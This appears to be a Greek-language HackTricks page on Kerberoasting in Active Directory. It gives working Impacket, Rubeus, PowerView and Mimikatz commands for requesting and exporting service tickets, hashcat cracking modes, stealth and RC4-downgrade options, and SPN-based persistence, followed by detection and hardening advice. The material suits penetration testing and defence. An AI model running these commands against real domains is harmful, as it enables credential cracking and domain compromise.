# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση TGS εισιτηρίων, συγκεκριμένα αυτών που σχετίζονται με υπηρεσίες που λειτουργούν υπό λογαριασμούς χρηστών στο Active Directory (AD), εξαιρώντας τους λογαριασμούς υπολογιστών. Η κρυπτογράφηση αυτών των εισιτηρίων χρησιμοποιεί κλειδιά που προέρχονται από τους κωδικούς πρόσβασης των χρηστών, επιτρέποντας την εκτός σύνδεσης διάσπαση διαπιστευτηρίων. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσία υποδεικνύεται από μια μη κενή ιδιότητα ServicePrincipalName (SPN).

Οποιοσδήποτε αυθεντικοποιημένος χρήστης τομέα μπορεί να ζητήσει TGS εισιτήρια, οπότε δεν απαιτούνται ειδικά προνόμια.

### Key Points

- Στοχεύει TGS εισιτήρια για υπηρεσίες που εκτελούνται υπό λογαριασμούς χρηστών (δηλαδή, λογαριασμούς με ρυθμισμένο SPN; όχι λογαριασμούς υπολογιστών).
- Τα εισιτήρια κρυπτογραφούνται με ένα κλειδί που προέρχεται από τον κωδικό πρόσβασης του λογαριασμού υπηρεσίας και μπορούν να σπάσουν εκτός σύνδεσης.
- Δεν απαιτούνται ανυψωμένα προνόμια; οποιοσδήποτε αυθεντικοποιημένος λογαριασμός μπορεί να ζητήσει TGS εισιτήρια.

> [!WARNING]
> Τα περισσότερα δημόσια εργαλεία προτιμούν να ζητούν εισιτήρια υπηρεσίας RC4-HMAC (etype 23) επειδή είναι πιο γρήγορα να σπάσουν από ότι το AES. Οι κατακερματισμοί RC4 TGS ξεκινούν με `$krb5tgs$23$*`, το AES128 με `$krb5tgs$17$*`, και το AES256 με `$krb5tgs$18$*`. Ωστόσο, πολλές περιβάλλοντα μετακινούνται σε μόνο AES. Μην υποθέτετε ότι μόνο το RC4 είναι σχετικό.
> Επίσης, αποφύγετε το “spray-and-pray” roasting. Το προεπιλεγμένο kerberoast του Rubeus μπορεί να ερωτήσει και να ζητήσει εισιτήρια για όλα τα SPNs και είναι θορυβώδες. Εξερευνήστε και στοχεύστε πρώτα ενδιαφέροντες κύριους.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Εργαλεία πολλαπλών χαρακτηριστικών που περιλαμβάνουν ελέγχους kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Καταγράψτε τους χρήστες που είναι επιρρεπείς σε kerberoast
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Τεχνική 1: Ζητήστε TGS και εξάγετε από τη μνήμη
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Τεχνική 2: Αυτόματα εργαλεία
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Ένα αίτημα TGS δημιουργεί το Windows Security Event 4769 (Ένα Kerberos service ticket ζητήθηκε).

### OPSEC και περιβάλλοντα μόνο με AES

- Ζητήστε RC4 σκόπιμα για λογαριασμούς χωρίς AES:
- Rubeus: `/rc4opsec` χρησιμοποιεί το tgtdeleg για να καταγράψει λογαριασμούς χωρίς AES και ζητά RC4 service tickets.
- Rubeus: `/tgtdeleg` με το kerberoast επίσης ενεργοποιεί αιτήματα RC4 όπου είναι δυνατόν.
- Ψήστε λογαριασμούς μόνο με AES αντί να αποτύχετε σιωπηλά:
- Rubeus: `/aes` καταγράφει λογαριασμούς με ενεργοποιημένο AES και ζητά AES service tickets (etype 17/18).
- Εάν ήδη κατέχετε ένα TGT (PTT ή από ένα .kirbi), μπορείτε να χρησιμοποιήσετε `/ticket:<blob|path>` με `/spn:<SPN>` ή `/spns:<file>` και να παραλείψετε το LDAP.
- Στοχοποίηση, περιορισμός και λιγότερος θόρυβος:
- Χρησιμοποιήστε `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` και `/jitter:<1-100>`.
- Φιλτράρετε για πιθανώς αδύνατους κωδικούς πρόσβασης χρησιμοποιώντας `/pwdsetbefore:<MM-dd-yyyy>` (παλαιότεροι κωδικοί πρόσβασης) ή στοχεύστε προνομιακά OUs με `/ou:<DN>`.

Παραδείγματα (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Σπάσιμο
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Αν ελέγχετε ή μπορείτε να τροποποιήσετε έναν λογαριασμό, μπορείτε να τον κάνετε kerberoastable προσθέτοντας ένα SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Κατεβάστε έναν λογαριασμό για να ενεργοποιήσετε το RC4 για ευκολότερη διάσπαση (απαιτούνται δικαιώματα εγγραφής στο αντικείμενο στόχο):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Μπορείτε να βρείτε χρήσιμα εργαλεία για επιθέσεις kerberoast εδώ: https://github.com/nidem/kerberoast

Αν βρείτε αυτό το σφάλμα από το Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` είναι λόγω τοπικής απόκλισης χρόνου. Συγχρονίστε με το DC:

- `ntpdate <DC_IP>` (παρωχημένο σε ορισμένες διανομές)
- `rdate -n <DC_IP>`

### Ανίχνευση

Το Kerberoasting μπορεί να είναι διακριτικό. Κυνηγήστε για το Event ID 4769 από τα DCs και εφαρμόστε φίλτρα για να μειώσετε τον θόρυβο:

- Εξαιρέστε το όνομα υπηρεσίας `krbtgt` και τα ονόματα υπηρεσιών που τελειώνουν με `$` (λογαριασμοί υπολογιστών).
- Εξαιρέστε αιτήματα από λογαριασμούς μηχανών (`*$$@*`).
- Μόνο επιτυχείς αιτήσεις (Κωδικός Αποτυχίας `0x0`).
- Παρακολουθήστε τους τύπους κρυπτογράφησης: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Μην ειδοποιείτε μόνο για `0x17`.

Παράδειγμα τριγωνοποίησης PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Βασική γραμμή κανονικής χρήσης SPN ανά υπολογιστή/χρήστη; ειδοποίηση για μεγάλες εκρήξεις διακριτών αιτημάτων SPN από έναν μόνο κύριο.
- Σημειώστε ασυνήθιστη χρήση RC4 σε τομείς που έχουν ενισχυθεί με AES.

### Mitigation / Hardening

- Χρησιμοποιήστε gMSA/dMSA ή λογαριασμούς μηχανής για υπηρεσίες. Οι διαχειριζόμενοι λογαριασμοί έχουν τυχαίους κωδικούς πρόσβασης 120+ χαρακτήρων και περιστρέφονται αυτόματα, καθιστώντας την εκτός σύνδεσης διάρρηξη μη πρακτική.
- Επιβάλετε AES σε λογαριασμούς υπηρεσιών ρυθμίζοντας το `msDS-SupportedEncryptionTypes` σε AES-only (δεκαδικό 24 / εξάδεκα 0x18) και στη συνέχεια περιστρέφοντας τον κωδικό πρόσβασης ώστε τα κλειδιά AES να προέρχονται.
- Όπου είναι δυνατόν, απενεργοποιήστε το RC4 στο περιβάλλον σας και παρακολουθήστε για προσπάθειες χρήσης RC4. Σε DCs μπορείτε να χρησιμοποιήσετε την τιμή μητρώου `DefaultDomainSupportedEncTypes` για να καθοδηγήσετε τις προεπιλογές για λογαριασμούς χωρίς ρυθμισμένο `msDS-SupportedEncryptionTypes`. Δοκιμάστε διεξοδικά.
- Αφαιρέστε περιττά SPNs από λογαριασμούς χρηστών.
- Χρησιμοποιήστε μακρούς, τυχαίους κωδικούς πρόσβασης λογαριασμού υπηρεσίας (25+ χαρακτήρες) εάν οι διαχειριζόμενοι λογαριασμοί δεν είναι εφικτοί; απαγορεύστε κοινούς κωδικούς πρόσβασης και ελέγξτε τακτικά.

### Kerberoast χωρίς λογαριασμό τομέα (AS-requested STs)

Το Σεπτέμβριο του 2022, ο Charlie Clark έδειξε ότι εάν ένας κύριος δεν απαιτεί προ-αυθεντικοποίηση, είναι δυνατόν να αποκτηθεί ένα εισιτήριο υπηρεσίας μέσω ενός κατασκευασμένου KRB_AS_REQ αλλάζοντας το sname στο σώμα του αιτήματος, αποκτώντας ουσιαστικά ένα εισιτήριο υπηρεσίας αντί για ένα TGT. Αυτό αντικατοπτρίζει το AS-REP roasting και δεν απαιτεί έγκυρες διαπιστεύσεις τομέα.

Δείτε λεπτομέρειες: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Πρέπει να παρέχετε μια λίστα χρηστών γιατί χωρίς έγκυρες διαπιστεύσεις δεν μπορείτε να κάνετε ερώτηση LDAP με αυτή την τεχνική.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Σχετικά

Αν στοχεύετε σε χρήστες που είναι ευάλωτοι σε AS-REP roast, δείτε επίσης:

{{#ref}}
asreproast.md
{{#endref}}

## Αναφορές

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Οι οδηγίες της Microsoft για να βοηθήσουν στην μείωση του Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Τεκμηρίωση Rubeus Roasting: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
